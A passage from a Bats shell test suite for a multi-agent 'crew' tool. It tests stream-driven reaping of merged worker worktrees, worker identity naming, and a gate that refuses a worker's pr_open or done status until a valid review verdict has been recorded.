  [ "$status" -eq 0 ]
  stop_stream
}

# _stream_seed_reapable <branch> <crew> — a `done` worker with a merged PR and
# no engine pane, worktree in place: reap's cheapest reclaim shape (see "reap:
# merged + done with no engine pane is reaped as before"). Stubs must be in
# place before start_stream, since the background stream process's PATH is
# fixed at launch.
_stream_seed_reapable() {
  local branch="$1" crew="$2" wt_path
  git branch "$branch"
  wt_path="$BATS_TEST_TMPDIR/${branch//\//-}-wt"
  git worktree add -q "$wt_path" "$branch"
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" ""
  CREW_ID="$crew" run_crew status "worker:$branch#s1-1" done "" "https://example.com/pr/1"
}

has_reap_line() { grep -q '"stream":"reap"' "$STREAM_OUT" 2>/dev/null; }

@test "stream: a cadence reap fires for a worker from another crew, never as a batch" {
  git commit -q --allow-empty -m init
  _stream_seed_reapable feat/x c9
  start_stream --crew c1 --reap-every 1 --park 1 --interval 1
  poll_for 150 has_reap_line

  line="$(grep '"stream":"reap"' "$STREAM_OUT" | head -n1)"
  run jq -e '.' <<<"$line"
  [ "$status" -eq 0 ]
  run jq -e '.crew == "c1"' <<<"$line"
  [ "$status" -eq 0 ]
  run jq -e '.lines | any(test("reaped feat/x"))' <<<"$line"
  [ "$status" -eq 0 ]
  run ! grep -q '"cursor"' "$STREAM_OUT"
  stop_stream
}

@test "stream: a terminal batch triggers an immediate reap, cadence aside" {
  git commit -q --allow-empty -m init
  git branch feat/x
  wt_path="$BATS_TEST_TMPDIR/feat-x-wt"
  git worktree add -q "$wt_path" feat/x
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" ""
  start_stream --crew c1 --reap-every 3600 --park 1 --interval 1
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done "" "https://example.com/pr/1"
  poll_for 150 has_reap_line

  line="$(grep '"stream":"reap"' "$STREAM_OUT" | head -n1)"
  run jq -e '.lines | any(test("reaped feat/x"))' <<<"$line"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: --reap-every 0 disables the terminal-batch reap trigger" {
  git commit -q --allow-empty -m init
  git branch feat/x
  wt_path="$BATS_TEST_TMPDIR/feat-x-wt"
  git worktree add -q "$wt_path" feat/x
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" ""
  start_stream --crew c1 --reap-every 0 --park 1 --interval 1
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done "" "https://example.com/pr/1"
  poll_for 100 at_least_lines 1
  sleep 3
  run ! has_reap_line
  stop_stream
}

@test "stream: rejects a non-numeric or negative --reap-every" {
  run --separate-stderr run_crew stream --crew c1 --reap-every nope
  [ "$status" -eq 64 ]
  [[ "$stderr" == *"--reap-every"* ]]

  run --separate-stderr run_crew stream --crew c1 --reap-every -1
  [ "$status" -eq 64 ]
  [[ "$stderr" == *"--reap-every"* ]]
}

@test "stream: a no-op reap is silent" {
  start_stream --crew c1 --reap-every 1 --park 1 --interval 1
  sleep 3
  # A no-op reap still creates its per-child pair; with the tracked child gone
  # the flush drops it, so at most the in-flight pair may remain (#602 review).
  [ "$(find "$(crew_dir c1)" -maxdepth 1 -name 'stream.reap.out.*' | wc -l)" -le 1 ]
  run ! has_reap_line
  stop_stream
}

@test "stream: a failing reap surfaces as one stream error line" {
  git commit -q --allow-empty -m init
  _stream_seed_reapable feat/x c9
  export WORKTREE_GIT_LIB="$BATS_TEST_TMPDIR/missing-worktree-git.sh"
  start_stream --crew c1 --reap-every 1 --park 1 --interval 1 --heartbeat 3600
  poll_for 150 grep -q '"detail":"reap: ' "$STREAM_OUT"
  sleep 3
  stop_stream

  run ! has_reap_line
  line="$(grep '"detail":"reap: ' "$STREAM_OUT" | head -n1)"
  run jq -e '.stream == "error" and .crew == "c1" and .rc != 0 and (.detail | test("missing-worktree-git"))' <<<"$line"
  [ "$status" -eq 0 ]
  # Rate-limited like the inner-watch errors: one cause, one line per heartbeat.
  [ "$(grep -c '"detail":"reap: ' "$STREAM_OUT")" -eq 1 ]
}

# #602: a reap child the stream spawned outlives the stream, so its late write
# must not clobber a newer stream's reap output. The hook stands in for `crew
# reap` (no real reap): A's child blocks on a release file, A is force-stopped,
# then B reaps. On base both share stream.reap.out; per-child files keep them apart.
@test "stream: a reap child that outlives its stream cannot clobber the next stream's reap output" {
  git commit -q --allow-empty -m init
  STREAM_CREW="$BATS_TEST_TMPDIR/crew-copy.sh"
  cp "$CREW" "$STREAM_CREW"
  # Prepend a hook point: only `reap` is diverted, so the stream loop itself
  # runs unmodified, and a nested `reap` re-enters the copy and hits the hook.
  copy="$BATS_TEST_TMPDIR/crew-copy.hooked.sh"
  {
    printf '%s\n' \
      'if [ "${1:-}" = reap ] && [ -n "${CREW_TEST_REAP_HOOK:-}" ]; then' \
      '  bash "$CREW_TEST_REAP_HOOK" "$@"; exit $?' \
      'fi'
    cat "$STREAM_CREW"
  } >"$copy"
  mv -f "$copy" "$STREAM_CREW"

  hook="$BATS_TEST_TMPDIR/reap-hook.sh"
  cat >"$hook" <<'EOF'
#!/usr/bin/env bash
[ -n "${REAP_TEST_STARTED:-}" ] && : >"$REAP_TEST_STARTED"
if [ -n "${REAP_TEST_RELEASE:-}" ]; then
  while [ ! -e "$REAP_TEST_RELEASE" ]; do sleep 0.05; done
fi
printf 'reaped %s\n' "${REAP_TEST_LABEL:-unknown}"
EOF
  chmod +x "$hook"
  export CREW_TEST_REAP_HOOK="$hook"

  # Stream A: its reap child blocks until released, so it outlives A.
  release="$BATS_TEST_TMPDIR/release-a"
  export REAP_TEST_STARTED="$BATS_TEST_TMPDIR/started-a" \
    REAP_TEST_RELEASE="$release" REAP_TEST_LABEL="feat/a"
  start_stream --crew c1 --reap-every 1 --park 1 --interval 1
  poll_for 100 test -e "$REAP_TEST_STARTED"
  stop_stream

  # Stream B: reaps promptly and flushes its own line.
  unset REAP_TEST_RELEASE
  export REAP_TEST_STARTED="$BATS_TEST_TMPDIR/started-b" REAP_TEST_LABEL="feat/b"
  start_stream --crew c1 --reap-every 1 --park 1 --interval 1
  poll_for 150 grep -q 'reaped feat/b' "$STREAM_OUT"

  # Release A's outlived child, then give B's loop time to flush whatever
  # landed in the file it reads.
  : >"$release"
  sleep 3

  # B printed its own reap and must never surface A's.
  run grep -q 'reaped feat/b' "$STREAM_OUT"
  [ "$status" -eq 0 ]
  run grep -q 'reaped feat/a' "$STREAM_OUT"
  [ "$status" -ne 0 ]
  stop_stream
}

@test "identity: a recorded name another live worker now holds is not reused" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/1-a","name":"nova","color":"magenta","tmux":"colour127"}' >>"$dir/events.jsonl"
  printf '%s\n' '{"ts":2,"crew_id":"c1","kind":"dispatch","branch":"feat/2-b","name":"nova","color":"magenta","tmux":"colour127"}' >>"$dir/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/1-a#s1-1" working
  [ "$(run_crew identity feat/2-b c1 | jq -r .name)" != "nova" ]
  CREW_ID=c1 run_crew status "worker:feat/1-a#s1-1" done
  [ "$(run_crew identity feat/2-b c1 | jq -r .name)" = "nova" ]
}

@test "identity: an unrecorded branch resolves with no tmux available" {
  mkdir -p "$BATS_TEST_TMPDIR/fakebin"
  printf '#!/bin/sh\nexit 1\n' >"$BATS_TEST_TMPDIR/fakebin/tmux"
  chmod +x "$BATS_TEST_TMPDIR/fakebin/tmux"
  PATH="$BATS_TEST_TMPDIR/fakebin:$PATH" run run_crew identity feat/9-new c1
  [ "$status" -eq 0 ]
  echo "$output" | jq -e 'has("name")'
}

@test "identity: of two live branches sharing a recorded name the earlier keeps it" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/1-a","name":"nova","color":"magenta","tmux":"colour127"}' >>"$dir/events.jsonl"
  printf '%s\n' '{"ts":2,"crew_id":"c1","kind":"dispatch","branch":"feat/2-b","name":"nova","color":"magenta","tmux":"colour127"}' >>"$dir/events.jsonl"
  [ "$(run_crew identity feat/1-a c1 | jq -r .name)" = "nova" ]
  [ "$(run_crew identity feat/2-b c1 | jq -r .name)" != "nova" ]
}

# --- terminal status gate: review seam (#241, #306) ---

_task_doc() { printf 'tier: %s\nkind: %s\nengine: %s\ncrew_id: c1\n' "$1" "${2:-implement}" "${3:-claude}" >WORKER_TASK.md; }
_acceptance_doc() {
  _task_doc "$@"
  printf '\n## Acceptance\n- AC1\n' >>WORKER_TASK.md
}
_status_rows() { jq -c 'select(.kind=="status")' "$(git rev-parse --git-common-dir)/crew/events.jsonl" 2>/dev/null | wc -l; }
_refused() {
  [ "$status" -eq 1 ]
  [[ "$stderr" == *"$1"* ]]
  [ "$(_status_rows)" -eq 0 ]
}
_waive() { run_crew reply "${1:-worker:feat/x#s1-1}" "${2:-waive AC1 AC2 AC3}" --crew c1; }
_deslop_seam() { run_crew msg "${1:-worker:feat/x#s1-1}" "review:c1" '{"seam":"deslop"}'; }

# Folded family — standard or deep with no review seam is refused and not written.
# The done: sibling stays its own test; the status verb differs.
@test "pr_open: standard or deep with no review seam is refused and not written" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label tier rc
  while IFS='|' read -r label tier <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc "$tier"
      run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
      _refused "no review seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: standard with no review seam is refused and not written|standard
pr_open: deep with no review seam is refused and not written|deep
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "done: standard with no review seam is refused and not written" {
  _task_doc standard
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "" https://example.com/pr/1
  _refused "no review seam"
}

# Folded family — a full or downgraded review seam posts silently.
@test "pr_open: a full or downgraded review seam posts silently" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label body rc
  while IFS='|' read -r label body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard
      run_crew msg "worker:feat/x#s1-1" "review:c1" "$body"
      _deslop_seam
      run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 pass(bats)" https://example.com/pr/1
      [ "$status" -eq 0 ]
      [ -z "$stderr" ]
      [ "$(jq -r 'select(.kind=="status") | .body.state' "$(git rev-parse --git-common-dir)/crew/events.jsonl")" = pr_open ]
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: standard with a review seam posts silently|{"seam":"review","review_mode":"full"}
pr_open: a downgraded review seam counts like a full one|{"seam":"review","review_mode":"downgraded"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a resumed session inherits the branch's earlier review seam" {
  _task_doc deep
  run_crew msg "worker:feat/x#s1-1" "review:c1" '{"seam":"review"}'
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s2-2" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  run --separate-stderr run_crew status "worker:feat/x#s2-2" done "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ "$(jq -r 'select(.kind=="status") | .body.state' "$(git rev-parse --git-common-dir)/crew/events.jsonl" | tr '\n' ' ')" = "pr_open done " ]
}

@test "pr_open: the grid reviewer assignment alone is not a review seam" {
  _task_doc standard implement pi
  run_crew msg "worker:feat/x#s1-1" "role:feat/x:reviewer" '{"seam":"review","artifact":"/a/review.diff","roster":"/a/roster.json","question":"Review this diff."}'
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

@test "pr_open: a pi reviewer accept alone counts as a review seam" {
  _task_doc standard implement pi
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"role":"reviewer","seam":"review","verdict":"accept","findings":[],"evidence":"x"}'
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ "$(_status_rows)" -eq 1 ]
}

_verdict() { run_crew msg "role:feat/x:reviewer" "${2:-worker:feat/x#s1-1}" "{\"role\":\"reviewer\",\"seam\":\"review\",\"verdict\":\"$1\"}"; }
_assign() { run_crew msg "worker:feat/x#s1-1" "role:feat/x:reviewer" '{"seam":"review","artifact":"/a/review.diff","question":"Review this diff."}'; }
_lead_seam() {
  local body='{"seam":"review","review_mode":"full"}'
  run_crew msg "worker:feat/x#s1-1" "review:c1" "${1:-$body}"
}
_gate() { run --separate-stderr run_crew status "worker:feat/x#${1:-s1-1}" pr_open "" https://example.com/pr/1; }
_allowed() {
  [ "$status" -eq 0 ]
  [ "$(_status_rows)" -eq 1 ]
}

# Folded family — a pi lone verdict that is not an accept to this worker.
@test "pr_open: a pi lone verdict that is not an accept to this worker is refused" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label verdict to rc
  while IFS='|' read -r label verdict to <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _verdict "$verdict" "$to"
      _gate
      _refused "no review seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi reviewer revise alone is refused|revise|worker:feat/x#s1-1
pr_open: a pi reviewer reject alone is refused|reject|worker:feat/x#s1-1
pr_open: a pi accept addressed to another worker as the only verdict is refused|accept|dispatcher:c1
pr_open: a pi verdict addressed to another branch's worker is refused|accept|worker:feat/other#s1-1
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a pi reject is not cleared by the lead's own review seam" {
  _task_doc standard implement pi
  _verdict reject
  _lead_seam
  _gate
  _refused "no review seam"
}

@test "pr_open: a pi reject is cleared by a later accept" {
  _task_doc standard implement pi
  _verdict reject
  _verdict accept
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a pi reject then revise then the lead's own review seam is allowed" {
  _task_doc standard implement pi
  _verdict reject
  _verdict revise
  _lead_seam
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a pi revise then the lead's own review seam is allowed" {
  _task_doc standard implement pi
  _verdict revise
  _lead_seam
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a pi revise then a later accept is allowed" {
  _task_doc standard implement pi
  _verdict revise
  _verdict accept
  _deslop_seam
  _gate
  _allowed
}

# Folded family — a pi accept then a non-accept verdict is refused.
@test "pr_open: a pi accept then a non-accept verdict is refused" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label verdict to rc
  while IFS='|' read -r label verdict to <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _verdict accept
      _verdict "$verdict" "$to"
      _gate
      _refused "no review seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi accept followed by a later reject is refused|reject|worker:feat/x#s1-1
pr_open: a pi accept then a reject addressed to the dispatcher is refused|reject|dispatcher:c1
pr_open: a pi accept then a wrong-case Reject verdict is refused|Reject|worker:feat/x#s1-1
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a pi verdict for an older head (review re-requested) is refused" {
  _task_doc standard implement pi
  _verdict accept
  _assign
  _gate
  _refused "no review seam"
}

@test "pr_open: a pi accept after the review was re-requested is allowed" {
  _task_doc standard implement pi
  _verdict accept
  _assign
  _verdict accept
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a re-requested pi review is not satisfied by the lead's own review seam" {
  _task_doc standard implement pi
  _verdict accept
  _assign
  _lead_seam
  _gate
  _refused "no review seam"
}

@test "pr_open: a re-requested pi review answered by an elided or invalid verdict is refused" {
  _task_doc standard implement pi
  _verdict accept
  _assign
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"role":"reviewer","seam":"review"}'
  _verdict maybe
  _gate
  _refused "no review seam"
}

@test "pr_open: a resumed session inherits the latest pi verdict, accept or reject" {
  _task_doc deep implement pi
  _verdict accept worker:feat/x#s1-1
  _deslop_seam
  _gate s2-2
  _allowed
  rm -f "$(git rev-parse --git-common-dir)/crew/events.jsonl"
  _verdict accept worker:feat/x#s1-1
  _verdict reject worker:feat/x#s1-1
  _gate s2-2
  _refused "no review seam"
}

@test "pr_open: a torn trailing line does not change the pi verdict outcome" {
  _task_doc standard implement pi
  _verdict accept
  _deslop_seam
  printf 'torn{' >>"$(git rev-parse --git-common-dir)/crew/events.jsonl"
  _gate
  [ "$status" -eq 0 ]
  rm -f "$(git rev-parse --git-common-dir)/crew/events.jsonl"
  _verdict reject
  printf 'torn{' >>"$(git rev-parse --git-common-dir)/crew/events.jsonl"
  _gate
  _refused "no review seam"
}

_events() { printf '%s' "$(git rev-parse --git-common-dir)/crew/events.jsonl"; }

@test "pr_open: a pi accept then an oversized reviewer reply whose seam and verdict got elided is refused" {
  _task_doc standard implement pi
  _verdict accept
  local big
  big=$(jq -nc '{role:"reviewer",seam:"review",verdict:"accept",findings:[range(0;400)|"finding number \(.) with some text"]}')
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" "$big"
  [ "$(tail -1 "$(_events)" | jq -r '.body | fromjson | .verdict')" != accept ]
  [ "$(tail -1 "$(_events)" | jq -r '.body | fromjson | .seam')" != review ]
  _gate
  _refused "no review seam"
}

@test "pr_open: a pi reject then a revise addressed to the dispatcher stays refused" {
  _task_doc standard implement pi
  _verdict reject
  _verdict revise dispatcher:c1
  _lead_seam
  _gate
  _refused "no review seam"
}

# F12: folded family — a pi accept then one non-verdict message is refused.
@test "pr_open: a pi accept then one non-verdict message is refused" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from to body expect rc
  while IFS='|' read -r label from to body expect <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _verdict accept
      run_crew msg "$from" "$to" "$body"
      _gate
      _refused "$expect"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi accept then an unparseable lead assignment to the reviewer is refused|worker:feat/x#s1-1|role:feat/x:reviewer|not json|no review seam
pr_open: a pi accept then a markdown-fenced reviewer reject is refused|role:feat/x:reviewer|worker:feat/x#s1-1|```json {"seam":"review","verdict":"reject"} ```|no review seam
pr_open: a pi accept then a reviewer msg whose body is a JSON array is refused|role:feat/x:reviewer|worker:feat/x#s1-1|[{"seam":"review","verdict":"reject"}]|no review seam
pr_open: a pi accept then a reject carrying a tag key is refused|role:feat/x:reviewer|worker:feat/x#s1-1|{"role":"reviewer","seam":"review","verdict":"reject","tag":"x"}|no review seam
pr_open: a pi accept then a final release that also carries a question is refused|worker:feat/x#s1-1|role:feat/x:reviewer|{"final":true,"question":"re-review please"}|no review seam
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

# Folded family — a pi accept survives two non-cancelling bus objects.
@test "pr_open: a pi accept survives two non-cancelling bus objects" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from1 to1 body1 from2 to2 body2 rc
  while IFS='|' read -r label from1 to1 body1 from2 to2 body2 <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _verdict accept
      run_crew msg "$from1" "$to1" "$body1"
      run_crew msg "$from2" "$to2" "$body2"
      _deslop_seam
      _gate
      _allowed
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi accept survives role_exited and final objects on the bus|role:feat/x:reviewer|worker:feat/x#s1-1|{"event":"role_exited"}|worker:feat/x#s1-1|dispatcher:c1|{"final":true}
pr_open: a pi accept survives a lead release that carries only final|worker:feat/x#s1-1|role:feat/x:reviewer|{"final":true}|worker:feat/x#s1-1|role:feat/other:reviewer|{"question":"another branch"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

# Folded family — a cancelling message after a pi accept is refused until a
# fresh accept. #392: a verdict-less reviewer reply on the pi path fails closed,
# so an earlier accept must not survive it; the next exact accept clears it.
# A re-request is any lead -> reviewer msg except the release: it does not have
# to carry seam or artifact.
@test "pr_open: a cancelling message after a pi accept is refused until a fresh accept" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from to body rc
  while IFS='|' read -r label from to body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _verdict accept
      run_crew msg "$from" "$to" "$body"
      _gate
      _refused "no review seam"
      _verdict accept
      _deslop_seam
      _gate
      _allowed
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi accept then a reviewer object with neither seam nor verdict is refused|role:feat/x:reviewer|worker:feat/x#s1-1|{"decision":"reject"}
pr_open: a pi accept then a lead question to the reviewer with no seam or artifact is refused|worker:feat/x#s1-1|role:feat/x:reviewer|{"question":"look again please"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

# Folded family — one message that is not a pi review seam is refused.
@test "pr_open: one message that is not a pi review seam is refused" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label body rc
  while IFS='|' read -r label body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" "$body"
      _gate
      _refused "no review seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi reviewer object with neither seam nor verdict alone is refused|{"decision":"accept"}
pr_open: a reviewer retro-style note is not a review seam|{"seam":"review","tag":"other","detail":"x"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

# F16: folded family — a pi accept survives one non-cancelling message.
@test "pr_open: a pi accept survives one non-cancelling message" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from to body rc
  while IFS='|' read -r label from to body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _verdict accept
      run_crew msg "$from" "$to" "$body"
      _deslop_seam
      _gate
      _allowed
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi accept survives a reviewer role_exited event with no seam or verdict|role:feat/x:reviewer|worker:feat/x#s1-1|{"role":"reviewer","event":"role_exited","pane":"%3","detail":"engine exited before a verdict"}
pr_open: a pi accept survives a reviewer tag-only note with no seam|role:feat/x:reviewer|worker:feat/x#s1-1|{"tag":"other","detail":"x"}
pr_open: a lead final release to the reviewer does not cancel an accept|worker:feat/x#s1-1|role:feat/x:reviewer|{"final":true}
pr_open: a pi accept survives a reviewer retro-style note|role:feat/x:reviewer|worker:feat/x#s1-1|{"seam":"review","tag":"other","detail":"x"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a pi accept then a mis-addressed accept still stands" {
  _task_doc standard implement pi
  _verdict accept
  _verdict accept dispatcher:c1
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a pi accept survives a numeric-from object line from another crew" {
  _task_doc standard implement pi
  _verdict accept
  printf '%s\n' '{"ts":1,"crew_id":"other","from":7,"to":8,"kind":"msg","body":"{}"}' >>"$(_events)"
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a pi reject then a new assignment then the lead's own seam is refused" {
  _task_doc standard implement pi
  _verdict reject
  _assign
  _lead_seam
  _gate
  _refused "no review seam"
}

@test "pr_open: a pi lead seam with review_mode false or null is refused" {
  _task_doc standard implement pi
  _lead_seam '{"seam":"review","review_mode":false}'
  _gate
  _refused "no review seam"
  _lead_seam '{"seam":"review","review_mode":null}'
  _gate
  _refused "no review seam"
}

@test "pr_open: off pi a re-assignment does not cancel the lead's own seam" {
  _task_doc standard implement claude
  _assign
  _lead_seam
  _deslop_seam
  _gate
  _allowed
}

# Folded family — a later lead-to-reviewer message cancels the lead's own seam.
